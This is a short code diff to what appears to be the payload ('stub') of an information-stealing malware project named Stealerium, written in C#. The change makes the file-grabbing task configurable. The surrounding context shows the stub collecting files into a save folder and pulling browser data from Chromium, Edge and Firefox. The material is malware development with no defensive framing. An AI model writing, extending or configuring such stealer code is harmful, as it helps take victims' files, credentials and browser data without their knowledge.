@@ -47,7 +47,10 @@ namespace Stealerium.Stub.Helpers
                 Directory.CreateDirectory(systemPath);
 
                 // Multi-threaded task: Grabbing files
-                tasks.Add(FileGrabber.RunAsync(sSavePath + "\\Grabber"));
+                if (Config.GrabberModule == "1")
+                {
+                    tasks.Add(FileGrabber.RunAsync(sSavePath + "\\Grabber"));
+                }
 
                 // Browser data recovery: Chromium, Edge, Firefox
                 tasks.Add(Task.Run(() =>
